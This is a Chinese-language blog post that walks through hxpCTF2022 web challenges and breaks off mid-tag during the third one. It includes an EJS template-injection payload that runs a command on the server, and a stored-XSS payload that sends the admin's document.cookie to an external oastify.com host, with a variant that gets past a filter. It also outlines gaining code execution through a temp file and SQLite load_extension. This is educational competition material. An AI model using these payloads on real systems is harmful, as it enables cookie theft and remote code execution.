<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>AmiaaaZ's Site | hxpCTF2022 Wp</title><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=generator content="Hugo 0.111.3"><meta name=ROBOTS content="INDEX, FOLLOW"><link href=/dist/app.css rel=stylesheet><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-203328343-1","auto"),ga("send","pageview"))</script><link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css crossorigin=anonymous><script defer src=https://amiaaaz.github.io/lib/katex.min.js crossorigin=anonymous></script>
<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js crossorigin=anonymous onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><script>(function(e,t){var s=document,o="script",n=s.createElement(o),i=s.getElementsByTagName(o)[0];n.src=e,t&&n.addEventListener("load",function(e){t(e)}),i.parentNode.insertBefore(n,i)})("https://amiaaaz.github.io/lib/pangu.min.js",function(){pangu.spacingPage()})</script><style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style></head><body class="bg-gray-100 text-gray-700 font-sans"><div class="p-6 sm:p-10 md:p-16 flex flex-wrap"><header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl"><div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2"><div><h2><a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a></h2></div><h1 class=pt-2>hxpCTF2022 Wp</h1><h3 class="text-java-700 font-normal leading-relaxed pt-2">老年web狗试图理解ctf</h3><div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light"><a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/ctf>CTF</a>
&nbsp;&nbsp;
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/wp>wp</a></div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2023-03-13T11:13:20+08:00>2023-3-13 11:13</time></div><details class=toc open><summary><hr></summary><div class="inline toc-content"><nav id=TableOfContents><ul><li><a href=#webvalentine>web/valentine</a></li><li><a href=#webarchived>web/archived</a></li><li><a href=#websqlite_web>web/sqlite_web</a></li><li><a href=#webtrue_web_assembly>*web/true_web_assembly</a></li></ul></nav></div></details><hr></div></header><main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4"><article><section class="mx-auto content"><div class=c-rich-text><p>上次打ctf，还是上次……有种物是人非的沧桑（）</p><p>好多知识已经不熟练了，要狠狠地学（）</p><hr><h2 id=webvalentine>web/valentine</h2><blockquote><p>Create an awesome template for your valentine and share it with the world!</p></blockquote><p>先看一眼页面 是js的模板渲染类的题，依赖库express和ejs都是无已知漏洞的最新版本（所以应该是没有这类题中常见的原型链污染情况），看一下app.js</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>express</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>bodyParser</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;body-parser&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>crypto</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#34;crypto&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>path</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;path&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>fs</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;fs&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>app</span> <span style=color:#f92672>=</span> <span style=color:#75af00>express</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span><span style=color:#75af00>viewsFolder</span> <span style=color:#f92672>=</span> <span style=color:#75af00>path</span><span style=color:#111>.</span><span style=color:#75af00>join</span><span style=color:#111>(</span><span style=color:#75af00>__dirname</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;views&#39;</span><span style=color:#111>);</span>  <span style=color:#75715e>// /app/views
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>existsSync</span><span style=color:#111>(</span><span style=color:#75af00>viewsFolder</span><span style=color:#111>))</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>  <span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>mkdirSync</span><span style=color:#111>(</span><span style=color:#75af00>viewsFolder</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>set</span><span style=color:#111>(</span><span style=color:#d88200>&#39;views&#39;</span><span style=color:#111>,</span> <span style=color:#75af00>viewsFolder</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>set</span><span style=color:#111>(</span><span style=color:#d88200>&#39;view engine&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ejs&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>bodyParser</span><span style=color:#111>.</span><span style=color:#75af00>urlencoded</span><span style=color:#111>({</span> <span style=color:#75af00>extended</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>false</span> <span style=color:#111>}))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>post</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/template&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>let</span> <span style=color:#75af00>tmpl</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>body</span><span style=color:#111>.</span><span style=color:#75af00>tmpl</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>let</span> <span style=color:#75af00>i</span> <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>while</span><span style=color:#111>((</span><span style=color:#75af00>i</span> <span style=color:#f92672>=</span> <span style=color:#75af00>tmpl</span><span style=color:#111>.</span><span style=color:#75af00>indexOf</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&lt;%&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>i</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span><span style=color:#111>))</span> <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0</span><span style=color:#111>)</span> <span style=color:#111>{</span>	<span style=color:#75715e>// 遍历tmpl所有内容
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>tmpl</span><span style=color:#111>.</span><span style=color:#75af00>substring</span><span style=color:#111>(</span><span style=color:#75af00>i</span><span style=color:#111>,</span> <span style=color:#75af00>i</span><span style=color:#f92672>+</span><span style=color:#ae81ff>11</span><span style=color:#111>)</span> <span style=color:#f92672>!==</span> <span style=color:#d88200>&#34;&lt;%= name %&gt;&#34;</span><span style=color:#111>)</span> <span style=color:#111>{</span>	<span style=color:#75715e>// 当出现了`&lt;%`那它必须是`&lt;%= name %&gt;`的开始部分
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>status</span><span style=color:#111>(</span><span style=color:#ae81ff>400</span><span style=color:#111>).</span><span style=color:#75af00>send</span><span style=color:#111>({</span><span style=color:#75af00>message</span><span style=color:#f92672>:</span><span style=color:#d88200>&#34;Only &#39;&lt;%= name %&gt;&#39; is allowed.&#34;</span><span style=color:#111>});</span>
</span></span><span style=display:flex><span>      <span style=color:#00a8c8>return</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>  <span style=color:#111>}</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>let</span> <span style=color:#75af00>uuid</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>do</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>uuid</span> <span style=color:#f92672>=</span> <span style=color:#75af00>crypto</span><span style=color:#111>.</span><span style=color:#75af00>randomUUID</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span>  <span style=color:#111>}</span> <span style=color:#00a8c8>while</span> <span style=color:#111>(</span><span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>existsSync</span><span style=color:#111>(</span><span style=color:#d88200>`views/</span><span style=color:#d88200>${</span><span style=color:#75af00>uuid</span><span style=color:#d88200>}</span><span style=color:#d88200>.ejs`</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>writeFileSync</span><span style=color:#111>(</span><span style=color:#d88200>`views/</span><span style=color:#d88200>${</span><span style=color:#75af00>uuid</span><span style=color:#d88200>}</span><span style=color:#d88200>.ejs`</span><span style=color:#111>,</span> <span style=color:#75af00>tmpl</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>  <span style=color:#111>}</span> <span style=color:#00a8c8>catch</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>status</span><span style=color:#111>(</span><span style=color:#ae81ff>500</span><span style=color:#111>).</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Failed to write Valentine&#39;s card&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>  <span style=color:#111>}</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>let</span> <span style=color:#75af00>name</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>body</span><span style=color:#111>.</span><span style=color:#75af00>name</span> <span style=color:#f92672>??</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>return</span> <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>redirect</span><span style=color:#111>(</span><span style=color:#d88200>`/</span><span style=color:#d88200>${</span><span style=color:#75af00>uuid</span><span style=color:#d88200>}</span><span style=color:#d88200>?name=</span><span style=color:#d88200>${</span><span style=color:#75af00>name</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>);</span> <span style=color:#75715e>// 直接跳转渲染
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/:template&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>let</span> <span style=color:#75af00>query</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>query</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>let</span> <span style=color:#75af00>template</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>params</span><span style=color:#111>.</span><span style=color:#75af00>template</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#d88200>/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i</span><span style=color:#111>.</span><span style=color:#75af00>test</span><span style=color:#111>(</span><span style=color:#75af00>template</span><span style=color:#111>))</span> <span style=color:#111>{</span> <span style=color:#75715e>// 只允许uuid
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>status</span><span style=color:#111>(</span><span style=color:#ae81ff>400</span><span style=color:#111>).</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Not a valid card id&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>  <span style=color:#111>}</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>existsSync</span><span style=color:#111>(</span><span style=color:#d88200>`views/</span><span style=color:#d88200>${</span><span style=color:#75af00>template</span><span style=color:#d88200>}</span><span style=color:#d88200>.ejs`</span><span style=color:#111>))</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>status</span><span style=color:#111>(</span><span style=color:#ae81ff>400</span><span style=color:#111>).</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#39;Valentine\&#39;s card does not exist&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>  <span style=color:#111>}</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>query</span><span style=color:#111>[</span><span style=color:#d88200>&#39;name&#39;</span><span style=color:#111>])</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>query</span><span style=color:#111>[</span><span style=color:#d88200>&#39;name&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;</span>
</span></span><span style=display:flex><span>  <span style=color:#111>}</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>return</span> <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#75af00>template</span><span style=color:#111>,</span> <span style=color:#75af00>query</span><span style=color:#111>);</span> <span style=color:#75715e>// 渲染的参数是整个query 不限制仅有name
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>return</span> <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>sendFile</span><span style=color:#111>(</span><span style=color:#d88200>&#39;./index.html&#39;</span><span style=color:#111>,</span> <span style=color:#111>{</span><span style=color:#75af00>root</span><span style=color:#f92672>:</span> <span style=color:#75af00>__dirname</span><span style=color:#111>});</span>
</span></span><span style=display:flex><span><span style=color:#111>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>listen</span><span style=color:#111>(</span><span style=color:#75af00>process</span><span style=color:#111>.</span><span style=color:#75af00>env</span><span style=color:#111>.</span><span style=color:#75af00>PORT</span> <span style=color:#f92672>||</span> <span style=color:#ae81ff>3000</span><span style=color:#111>);</span>
</span></span></code></pre></div><p>审过代码之后我们很自然地想到ejs是否有不是以<code>&lt;%</code>开头的标签可以作为模板，直接看文档<a href=https://github.com/mde/ejs/blob/main/docs/syntax.md>syntax.md</a></p><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313003218731.png alt=image-20230313003218731></p><p>直接看标题觉得可能没戏，但注意到了典中典之<a href=https://github.com/mde/ejs#custom-delimiters>Delimiters</a></p><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313003309727.png alt=image-20230313003309727></p><p>delimiters可以被应用在单一模板上也可以全局启用</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>let</span> <span style=color:#75af00>ejs</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;ejs&#39;</span><span style=color:#111>),</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>users</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#d88200>&#39;geddy&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;neil&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;alex&#39;</span><span style=color:#111>];</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Just one template
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>ejs</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;&lt;p&gt;[?= users.join(&#34; | &#34;); ?]&lt;/p&gt;&#39;</span><span style=color:#111>,</span> <span style=color:#111>{</span><span style=color:#75af00>users</span><span style=color:#f92672>:</span> <span style=color:#75af00>users</span><span style=color:#111>},</span> <span style=color:#111>{</span><span style=color:#75af00>delimiter</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;?&#39;</span><span style=color:#111>,</span> <span style=color:#75af00>openDelimiter</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;[&#39;</span><span style=color:#111>,</span> <span style=color:#75af00>closeDelimiter</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;]&#39;</span><span style=color:#111>});</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// =&gt; &#39;&lt;p&gt;geddy | neil | alex&lt;/p&gt;&#39;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Or globally
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>ejs</span><span style=color:#111>.</span><span style=color:#75af00>delimiter</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;?&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span><span style=color:#75af00>ejs</span><span style=color:#111>.</span><span style=color:#75af00>openDelimiter</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;[&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span><span style=color:#75af00>ejs</span><span style=color:#111>.</span><span style=color:#75af00>closeDelimiter</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;]&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span><span style=color:#75af00>ejs</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;&lt;p&gt;[?= users.join(&#34; | &#34;); ?]&lt;/p&gt;&#39;</span><span style=color:#111>,</span> <span style=color:#111>{</span><span style=color:#75af00>users</span><span style=color:#f92672>:</span> <span style=color:#75af00>users</span><span style=color:#111>});</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// =&gt; &#39;&lt;p&gt;geddy | neil | alex&lt;/p&gt;&#39;
</span></span></span></code></pre></div><p>很容易构造payload</p><ol><li>POST /template
tmpl=&lt;==global.process.mainModule.constructor._load(&lsquo;child_process&rsquo;).exec(&rsquo;/readflag&rsquo;).toString()=>
这里的<code>&lt;==</code>表示escaped output，也可以用<code>&lt;=-</code>得到unescaped output</li><li>因为app会默认写入模板后直接redirect渲染，我们抓包改一下redirect的目标url，在query参数中添加<code>&amp;delimiter=%3D</code>，因为render会把query所有参数都拿去渲染，所以这样修改是可行的</li></ol><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313004950832.png alt=image-20230313004950832></p><h2 id=webarchived>web/archived</h2><blockquote><p>I’m using this super secure big company open source software, what could go wrong?</p></blockquote><p>提示里的"big company open source software"指的是apache archiva，不过题目中用到的2.2.9版本并没有最新的cve可以参考</p><p>简单扫一眼docker配置可以知道这可能跟xss/csrf有关系（涉及到了admin bot和selenium），看一下admin.py的行为</p><p>*直接就是一手偷懒，好偷</p><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313010733474.png alt=image-20230313010733474></p><p>这里的“浏览器打开受限页面”指的是</p><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313011026684.png alt=image-20230313011026684></p><p>显然我们需要在admin打开/repository/internal的过程中获得到cookie，那目标就变成了如何向这个页面写入xss的代码</p><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313014252680.png alt=image-20230313014252680></p><p>Upload Artifact可以上传依赖，有这些参数可以自定义，随便试一下（先upload再save）</p><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313020339420.png alt=image-20230313020339420></p><p>访问/repository/internal，我们的文件确实在这里</p><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313021105798.png alt=image-20230313021105798></p><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313020419888.png alt=image-20230313020419888></p><p>然鹅admin访问的只是/repository/internal，目录的1在html中是</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#111>&lt;</span><span style=color:#f92672>a</span> <span style=color:#75af00>class</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;folder&#34;</span> <span style=color:#75af00>href</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;1/&#34;</span><span style=color:#111>&gt;</span>1<span style=color:#111>&lt;/</span><span style=color:#f92672>a</span><span style=color:#111>&gt;</span>
</span></span></code></pre></div><p>直接写个payload试试</p><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313021646324.png alt=image-20230313021646324></p><p>试试就逝世，没有想象中的渲染 甚至根本没存……</p><p>然后就卡住了，看wp，这里是直接把页面上的4个选项都置空，也就是在最后的文件名写payload</p><pre tabindex=0><code>/restServices/archivaUiServices/fileUploadService/save/internal/%20/%20/%20/&lt;payload&gt;
</code></pre><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#111>&lt;</span><span style=color:#f92672>img</span> <span style=color:#75af00>src</span><span style=color:#f92672>=</span><span style=color:#d88200>x</span> <span style=color:#75af00>onerror</span><span style=color:#f92672>=</span><span style=color:#d88200>s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;http://b2eiq6hi7jbhisck3pg095jv6mcc01.oastify.com/?cookie=&#39;+btoa(document.cookie);</span><span style=color:#111>&gt;</span>
</span></span></code></pre></div><p>但是上面这种payload也是不能直接用的，因为<code>DefaultFileUploadService.java#hasValidChars</code>会检测<code>/</code>，我们要手动转义</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#111>&lt;</span><span style=color:#f92672>img</span> <span style=color:#75af00>src</span><span style=color:#f92672>=</span><span style=color:#d88200>x</span> <span style=color:#75af00>onerror</span><span style=color:#f92672>=</span><span style=color:#d88200>s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;http:&amp;#47;&amp;#47;929gq4hg7hbfiqci3ngy93jt6kcp0e.oastify.com&amp;#47;?cookie=&#39;+btoa(document.cookie);</span><span style=color:#111>&gt;</span>
</span></span></code></pre></div><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313023852710.png alt=image-20230313023852710></p><p>之后任意文件读，读到flag</p><p><code>hxp{xSS_h3re_Xs5_ther3_X5S_ev3rywhere}</code></p><h2 id=websqlite_web>web/sqlite_web</h2><blockquote><p>We hacked your database, locked you out of your server and encrypted all your tables. If you want them back, send us ONE MILLION DOLLARS and we will send you the password (flag) which is safely stored on the server.</p></blockquote><p>提示中说的"encrypt you all tables"指的是</p><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313101310325.png alt=image-20230313101310325></p><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313103517308.png alt=image-20230313103517308></p><p>数据库中的flag被用这样的方式加密了，我们想得到flag只能读/flag.txt 但由于权限的设置只能运行/readflag，那就需要rce了</p><p>一般的sqlite是没有web ui的，这里用了https://github.com/coleifer/sqlite-web，可能就是突破点 <del>（但我这个脑子也就只够想到这里</del></p><p>这个sqlite-web项目本质是跑在flask 也就是werkzeug上的，这里用了跟21年hxp类似的临时文件lfi手法；werkzeug在存在这样的<a href=https://github.com/pallets/werkzeug/blob/main/src/werkzeug/formparser.py#L56>代码</a></p><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313104035742.png alt=image-20230313104035742></p><p><code>SpooledTemporaryFile</code>和<code>TemporaryFile</code>都是带有自动清理功能的接口，文档中这样描述</p><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313105243489.png alt=image-20230313105243489></p><p><img src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313105415243.png alt=image-20230313105415243></p><p>我们有了在服务器上写入任意文件的能力，接下来的问题就是写什么、如何找到缓存文件的位置、如何rce来得到flag</p><p>由于环境在sqlite中，我们可以通过<code>load_extension</code>来加载.so文件，我们可以生成一个大于500kb的含有恶意代码的.so并在query中对它进行触发，flag以外带的方式得到</p><p>*鸡贼的出题人把sqlite-web自带的import从页面上删掉了，不过路由中仍然存在</p><p><img 